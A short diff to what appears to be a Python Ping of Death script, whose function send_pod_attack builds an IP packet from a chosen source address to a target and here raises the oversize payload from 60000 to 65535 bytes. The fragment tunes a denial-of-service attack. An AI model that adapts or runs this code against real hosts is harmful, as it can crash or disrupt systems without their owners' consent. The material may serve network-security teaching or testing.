@@ -35,7 +35,7 @@ def send_pod_attack(source_ip, target_ip):
     try:
         # create an oversize paylaod
         # payload that larger than the maximum size
-        oversize_payload = b"A" * 60000
+        oversize_payload = b"A" * 65535
 
         # construct the packets
         ip_packet = IP(src=source_ip, dst=target_ip)
